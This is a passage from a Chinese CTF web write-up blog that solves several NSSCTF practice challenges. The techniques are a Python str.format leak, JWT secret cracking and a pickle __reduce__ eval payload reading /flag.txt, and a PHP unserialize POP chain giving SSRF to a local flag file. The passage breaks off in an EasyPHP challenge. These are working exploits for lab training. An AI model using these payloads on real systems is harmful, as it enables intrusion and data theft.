class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG </span><br><span class="line"><span class="keyword">import</span> datetime </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) </span><br><span class="line">ctx = f.read() </span><br><span class="line">f.close() </span><br><span class="line"></span><br><span class="line">f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">flAg = FLAG(f1ag) </span><br><span class="line">message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp </span><br><span class="line"><span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>: </span><br><span class="line"><span class="keyword">return</span> ctx </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> message.<span class="built_in">format</span>(flAg) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run() </span><br></pre></td></tr></table></figure><p>关键的利用点在message.format(flAg)和message &#x3D; “Your flag is {0}” + exp </p><p>考点不出意外就是format函数</p><p>这其实可以看做是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Your flag is flAg&quot; + exp </span><br></pre></td></tr></table></figure><p>，后面还有个exp可控，我们让他也为{}，那么这个内容就可控了</p><p><img src="http://49.232.222.195/usr/uploads/2024/01/3143471657.png" alt="2024-01-24T10:25:56.png"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162431715.png" alt="image-20241217162431715"></p><p>那么我们让exp为如下试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0.__class__&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162525349.png" alt="image-20241217162525349"></p><p>成功，接下来看globals即可。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162550738.png" alt="image-20241217162550738" style="zoom: 67%;" /><h2 id="CISCN-2019华北Day1-Web2"><a href="#CISCN-2019华北Day1-Web2" class="headerlink" title="[CISCN 2019华北Day1]Web2"></a>[CISCN 2019华北Day1]Web2</h2><p>注册一个账号然后登陆进入就行。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183017666.png" alt="image-20241217183017666"></p><p>ikun们冲呀，一定要买到lv6</p><p>ok，下面找lv6就行，但是翻了好多页都没有，可能数字很大，我们爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28454/shop?page=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    target=url+<span class="built_in">str</span>(i)</span><br><span class="line">    res=requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>180，ok拿捏</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183108043.png" alt="image-20241217183108043" style="zoom:67%;" /><p>天价，那么接下来可能考点就是支付逻辑漏洞</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183711068.png" alt="image-20241217183711068"></p><p>这里需要admin用户才行，同时给了jwt，那么我们伪造jwt就行，这里我试了很多方法都不行，后来jwtcrack一下直接爆破出了密钥</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217184946236.png" alt="image-20241217184946236"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1Kun</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217185044193.png" alt="image-20241217185044193"></p><p>在源代码看到<a href="http://www.zip/">www.zip</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在admin.py处发现pickle.loads，存在pickle反序列化</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217191850648.png" alt="image-20241217191850648" style="zoom:67%;" /><p>同时看一下对于路由的配置，对应的是&#x2F;b1g_m4mber路由，那么我们只需要在这个路由下进行pickle反序列化即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line">d=urllib.quote(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>这里当时试了好久，后来才知道urllib.unquote对应python2版本，要用python2来，不能用python3，同时cmd类中要继承object才行！！！</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217194810760.png" alt="image-20241217194810760" style="zoom: 67%;" /><h2 id="SWPUCTF-2022-新生赛-Power"><a href="#SWPUCTF-2022-新生赛-Power" class="headerlink" title="[SWPUCTF 2022 新生赛]Power!"></a>[SWPUCTF 2022 新生赛]Power!</h2><p>主要是关于php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Image Viewer ~ @V@&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;This is a Image viewer&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;/&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;vergil.jpg&quot;</span> name=<span class="string">&quot;image_path&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- ?source= --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$b</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:1:&quot;a&quot;;O:8:&quot;Backdoor&quot;:3:&#123;s:1:&quot;a&quot;;O:10:&quot;FileViewer&quot;:3:&#123;s:10:&quot;black_list&quot;;s:3:&quot;111&quot;;s:5:&quot;local&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;&#125;s:1:&quot;b&quot;;s:5:&quot;local&quot;;s:11:&quot;superhacker&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;&#125;s:1:&quot;a&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>用到gc回收机制等</p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span 